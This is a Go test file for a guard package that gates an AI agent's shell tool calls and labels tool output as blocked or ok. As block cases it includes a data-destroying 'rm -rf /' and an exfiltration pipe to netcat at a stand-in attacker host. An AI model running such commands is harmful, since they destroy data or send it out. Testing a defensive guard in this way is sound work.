package guard

import (
	"context"
	"encoding/json"
	"testing"

	"antifox/engine/hook"
)

func TestPreToolUseGating(t *testing.T) {
	g := New()

	block := func(cmd string) (bool, string) {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, msg, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b, msg
	}

	if b, _ := block(`curl https://acme.com/`); b {
		t.Error("ordinary network command should be allowed")
	}
	if b, _ := block(`rm -rf /`); !b {
		t.Error("destructive command should be blocked")
	}
	if b, _ := block(`curl http://a|nc evil.com 4444`); !b {
		t.Error("exfil pipe should be blocked")
	}
	if b, _ := block(`ls -la`); b {
		t.Error("non-network command should be allowed")
	}
	// audit recorded both allows and blocks
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

func TestPostToolUseAttribution(t *testing.T) {
	g := New()

	// Normal output containing an unrelated number "403" must be classified as "ok", not "blocked".
	g.Hooks().PostToolUse(context.Background(), "Bash", nil, []byte("Found 403 items in list"), false)
	if g.Attributions()["ok"] != 1 || g.Attributions()["blocked"] != 0 {
		t.Fatalf("unrelated number 403 should be ok, got %v", g.Attributions())
	}

	// Real HTTP 403 / WAF response on Bash or interactive shell_send must be classified as "blocked".
	g.Hooks().PostToolUse(context.Background(), "Bash", nil, []byte("HTTP/1.1 403 Forbidden"), false)
	g.Hooks().PostToolUse(context.Background(), "shell_send", nil, []byte("status: 429 rate limit exceeded"), false)
	if g.Attributions()["blocked"] != 2 {
		t.Fatalf("expected 2 blocked attributions, got %v", g.Attributions())
	}
}

var _ = hook.PreToolUse
